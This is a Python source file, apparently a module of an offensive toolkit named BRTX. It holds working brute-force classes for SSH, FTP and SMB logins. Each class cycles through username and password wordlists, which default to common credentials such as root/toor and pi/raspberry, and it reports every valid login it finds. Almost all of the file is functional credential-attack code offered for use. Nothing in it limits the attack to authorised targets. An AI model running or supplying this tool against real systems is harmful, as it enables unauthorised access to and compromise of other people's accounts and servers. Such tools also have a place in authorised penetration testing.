#!/usr/bin/env python3
# modules/ssh_brute.py — SSH brute force for BRTX

import socket
import time
from modules.base import BaseModule
from utils.colors import Colors, print_status, print_section

DEFAULT_USERLIST = ["root", "admin", "user", "ubuntu", "ec2-user", "pi", "ansible", "deploy"]
DEFAULT_PASSLIST = ["root", "admin", "password", "123456", "toor", "pass", "1234", "raspberry"]


class SSHBrute(BaseModule):

    NAME        = "brute/ssh"
    DESCRIPTION = "SSH credential brute force via paramiko"
    PROTOCOL    = "SSH"
    REFERENCES  = ["https://docs.paramiko.org"]

    def _define_options(self):
        self._add_option("TARGET",   "",    True,  "Target IP or hostname")
        self._add_option("PORT",     "22",  False, "SSH port (default: 22)")
        self._add_option("USERLIST", "",    False, "Path to username wordlist")
        self._add_option("PASSLIST", "",    False, "Path to password wordlist")
        self._add_option("USERNAME", "",    False, "Single username")
        self._add_option("TIMEOUT",  "5",   False, "Connection timeout in seconds")
        self._add_option("DELAY",    "0.3", False, "Delay between attempts in seconds")

    def run(self) -> list:
        if not self._validate():
            return []

        try:
            import paramiko
        except ImportError:
            print_status("paramiko not installed. Run: pip install paramiko --break-system-packages", "error")
            return []

        target   = self.get_option("TARGET").strip()
        port     = int(self.get_option("PORT") or 22)
        timeout  = int(self.get_option("TIMEOUT") or 5)
        delay    = float(self.get_option("DELAY") or 0.3)

        usernames = self._load_wordlist(self.get_option("USERLIST"), DEFAULT_USERLIST)
        passwords = self._load_wordlist(self.get_option("PASSLIST"), DEFAULT_PASSLIST)
        single    = self.get_option("USERNAME")
        if single:
            usernames = [single]

        print_section(f"SSH Brute Force — {target}:{port}")
        print_status(f"Usernames : {Colors.WHITE}{len(usernames)}{Colors.RESET}", "info")
        print_status(f"Passwords : {Colors.WHITE}{len(passwords)}{Colors.RESET}", "info")
        print()

        findings = []
        total = len(usernames) * len(passwords)
        count = 0

        for username in usernames:
            for password in passwords:
                count += 1
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    client.connect(
                        target, port=port,
                        username=username, password=password,
                        timeout=timeout, allow_agent=False, look_for_keys=False,
                        banner_timeout=timeout,
                    )
                    print(f"\n  {Colors.BOLD}{Colors.GREEN}[VALID]{Colors.RESET} "
                          f"{Colors.WHITE}{username}{Colors.RESET}:{Colors.WHITE}{password}{Colors.RESET} "
                          f"{Colors.DARK_GRAY}@ {target}:{port}{Colors.RESET}\n")
                    findings.append(self._credential(target, username, password, extra={"port": port}))
                    client.close()
                except paramiko.AuthenticationException:
                    print(f"  [{count:>5}/{total}] {Colors.CYAN}{username:<20}{Colors.RESET}"
                          f"{Colors.WHITE}{password:<20}{Colors.RESET} {Colors.DARK_GRAY}[FAIL]{Colors.RESET}")
                except (socket.timeout, socket.error, paramiko.SSHException):
                    print(f"  [{count:>5}/{total}] {Colors.YELLOW}[CONN ERROR]{Colors.RESET} {target}:{port}")
                finally:
                    client.close()

                if delay > 0:
                    time.sleep(delay)

        print()
        if findings:
            print_status(f"Found {Colors.GREEN}{len(findings)}{Colors.RESET} valid credential(s).", "ok")
        else:
            print_status("No valid credentials found.", "warn")
        return findings

    def _load_wordlist(self, path, default):
        import os
        if path and os.path.isfile(path):
            try:
                with open(path) as f:
                    return [l.strip() for l in f if l.strip() and not l.startswith("#")]
            except Exception:
                pass
        return default


# ─────────────────────────────────────────────────────────────────
#  FTP
# ─────────────────────────────────────────────────────────────────

class FTPBrute(BaseModule):

    NAME        = "brute/ftp"
    DESCRIPTION = "FTP credential brute force"
    PROTOCOL    = "FTP"
    REFERENCES  = ["https://docs.python.org/3/library/ftplib.html"]

    def _define_options(self):
        self._add_option("TARGET",   "",    True,  "Target IP or hostname")
        self._add_option("PORT",     "21",  False, "FTP port (default: 21)")
        self._add_option("USERLIST", "",    False, "Path to username wordlist")
        self._add_option("PASSLIST", "",    False, "Path to password wordlist")
        self._add_option("USERNAME", "",    False, "Single username")
        self._add_option("TIMEOUT",  "5",   False, "Connection timeout in seconds")
        self._add_option("DELAY",    "0.3", False, "Delay between attempts in seconds")

    def run(self) -> list:
        if not self._validate():
            return []

        from ftplib import FTP, error_perm
        import os

        target   = self.get_option("TARGET").strip()
        port     = int(self.get_option("PORT") or 21)
        timeout  = int(self.get_option("TIMEOUT") or 5)
        delay    = float(self.get_option("DELAY") or 0.3)

        default_users = ["anonymous", "admin", "ftp", "user", "root", "ftpuser"]
        default_pass  = ["anonymous", "admin", "ftp", "password", "123456", ""]
        usernames = self._load_wordlist(self.get_option("USERLIST"), default_users)
        passwords = self._load_wordlist(self.get_option("PASSLIST"), default_pass)
        single    = self.get_option("USERNAME")
        if single:
            usernames = [single]

        print_section(f"FTP Brute Force — {target}:{port}")
        print_status(f"Usernames : {Colors.WHITE}{len(usernames)}{Colors.RESET}", "info")
        print_status(f"Passwords : {Colors.WHITE}{len(passwords)}{Colors.RESET}", "info")
        print()

        findings = []
        total = len(usernames) * len(passwords)
        count = 0

        for username in usernames:
            for password in passwords:
                count += 1
                try:
                    ftp = FTP()
                    ftp.connect(target, port, timeout=timeout)
                    ftp.login(username, password)
                    print(f"\n  {Colors.BOLD}{Colors.GREEN}[VALID]{Colors.RESET} "
                          f"{Colors.WHITE}{username}{Colors.RESET}:{Colors.WHITE}{password}{Colors.RESET} "
                          f"{Colors.DARK_GRAY}@ {target}:{port}{Colors.RESET}\n")
                    findings.append(self._credential(target, username, password, extra={"port": port}))
                    ftp.quit()
                except error_perm:
                    print(f"  [{count:>5}/{total}] {Colors.CYAN}{username:<18}{Colors.RESET}"
                          f"{Colors.WHITE}{password:<18}{Colors.RESET} {Colors.DARK_GRAY}[FAIL]{Colors.RESET}")
                except Exception:
                    print(f"  [{count:>5}/{total}] {Colors.YELLOW}[CONN ERROR]{Colors.RESET}")

                if delay > 0:
                    time.sleep(delay)

        print()
        if findings:
            print_status(f"Found {Colors.GREEN}{len(findings)}{Colors.RESET} valid credential(s).", "ok")
        else:
            print_status("No valid credentials found.", "warn")
        return findings

    def _load_wordlist(self, path, default):
        import os
        if path and os.path.isfile(path):
            try:
                with open(path) as f:
                    return [l.strip() for l in f if l.strip() and not l.startswith("#")]
            except Exception:
                pass
        return default


# ─────────────────────────────────────────────────────────────────
#  SMB
# ─────────────────────────────────────────────────────────────────

class SMBBrute(BaseModule):

    NAME        = "brute/smb"
    DESCRIPTION = "SMB credential brute force via smbclient or impacket"
    PROTOCOL    = "SMB/445"
    REFERENCES  = [
        "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html",
    ]

    def _define_options(self):
        self._add_option("TARGET",   "",    True,  "Target IP or hostname")
        self._add_option("DOMAIN",   ".",   False, "Domain or workgroup (default: .)")
        self._add_option("SHARE",    "IPC$",False, "SMB share to test against (default: IPC$)")
        self._add_option("USERLIST", "",    False, "Path to username wordlist")
        self._add_option("PASSLIST", "",    False, "Path to password wordlist")
        self._add_option("USERNAME", "",    False, "Single username")
        self._add_option("TIMEOUT",  "5",   False, "Connection timeout in seconds")
        self._add_option("DELAY",    "0.5", False, "Delay between attempts in seconds")

    def run(self) -> list:
        if not self._validate():
            return []

        import shutil, subprocess, os, time as t

        target  = self.get_option("TARGET").strip()
        domain  = self.get_option("DOMAIN") or "."
        share   = self.get_option("SHARE")  or "IPC$"
        delay   = float(self.get_option("DELAY") or 0.5)
        timeout = int(self.get_option("TIMEOUT") or 5)

        # Check for smbclient
        if not shutil.which("smbclient"):
            print_status("smbclient not found. Install: apt install smbclient", "error")
            return []

        default_users = ["administrator", "admin", "guest", "user"]
        default_pass  = ["", "admin", "password", "123456", "Password1"]
        usernames = self._load_wordlist(self.get_option("USERLIST"), default_users)
        passwords = self._load_wordlist(self.get_option("PASSLIST"), default_pass)
        single    = self.get_option("USERNAME")
        if single:
            usernames = [single]

        print_section(f"SMB Brute Force — {target}")
        print_status(f"Domain    : {Colors.WHITE}{domain}{Colors.RESET}", "info")
        print_status(f"Share     : {Colors.WHITE}{share}{Colors.RESET}", "info")
        print_status(f"Usernames : {Colors.WHITE}{len(usernames)}{Colors.RESET}", "info")
        print_status(f"Passwords : {Colors.WHITE}{len(passwords)}{Colors.RESET}", "info")
        print()

        findings = []
        total = len(usernames) * len(passwords)
        count = 0

        for username in usernames:
            for password in passwords:
                count += 1
                cmd = [
                    "smbclient", f"//{target}/{share}",
                    "-U", f"{domain}\\{username}%{password}",
                    "-c", "exit", "--timeout", str(timeout),
                ]
                try:
                    result = subprocess.run(
                        cmd, capture_output=True, text=True, timeout=timeout + 2
                    )
                    success = result.returncode == 0

                    if success:
                        print(f"\n  {Colors.BOLD}{Colors.GREEN}[VALID]{Colors.RESET} "
                              f"{Colors.WHITE}{username}{Colors.RESET}:"
                              f"{Colors.WHITE}{password}{Colors.RESET} "
                              f"{Colors.DARK_GRAY}@ {target}{Colors.RESET}\n")
                        findings.append(self._credential(
                            target, username, password,
                            extra={"domain": domain, "share": share}
                        ))
                    else:
                        print(f"  [{count:>5}/{total}] {Colors.CYAN}{username:<18}{Colors.RESET}"
                              f"{Colors.WHITE}{password:<18}{Colors.RESET} "
                              f"{Colors.DARK_GRAY}[FAIL]{Colors.RESET}")
                except subprocess.TimeoutExpired:
                    print(f"  [{count:>5}/{total}] {Colors.YELLOW}[TIMEOUT]{Colors.RESET}")
                except Exception as e:
                    print(f"  [{count:>5}/{total}] {Colors.YELLOW}[ERROR]{Colors.RESET} {e}")

                if delay > 0:
                    t.sleep(delay)

        print()
        if findings:
            print_status(f"Found {Colors.GREEN}{len(findings)}{Colors.RESET} valid credential(s).", "ok")
        else:
            print_status("No valid credentials found.", "warn")
        return findings

    def _load_wordlist(self, path, default):
        import os
        if path and os.path.isfile(path):
            try:
                with open(path) as f:
                    return [l.strip() for l in f if l.strip() and not l.startswith("#")]
            except Exception:
                pass
        return default
